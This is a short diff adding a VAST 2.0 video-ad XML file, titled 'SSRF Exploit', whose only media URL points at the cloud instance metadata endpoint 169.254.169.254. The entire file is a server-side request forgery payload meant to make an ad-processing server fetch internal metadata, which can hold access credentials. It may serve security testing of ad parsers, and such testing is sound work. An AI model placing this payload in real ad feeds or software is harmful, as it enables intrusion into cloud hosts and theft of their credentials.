@@ -1,0 +1,20 @@
+<VAST version="2.0">
+  <Ad id="999">
+    <InLine>
+      <AdSystem>adssrf</AdSystem>
+      <AdTitle>SSRF Exploit</AdTitle>
+      <Creatives>
+        <Creative>
+          <Linear>
+            <Duration>00:00:01</Duration>
+            <MediaFiles>
+              <MediaFile delivery="progressive" width="1" height="1" type="video/mp4">
+                <![CDATA[http://169.254.169.254/latest/meta-data/]]>
+              </MediaFile>
+            </MediaFiles>
+          </Linear>
+        </Creative>
+      </Creatives>
+    </InLine>
+  </Ad>
+</VAST>
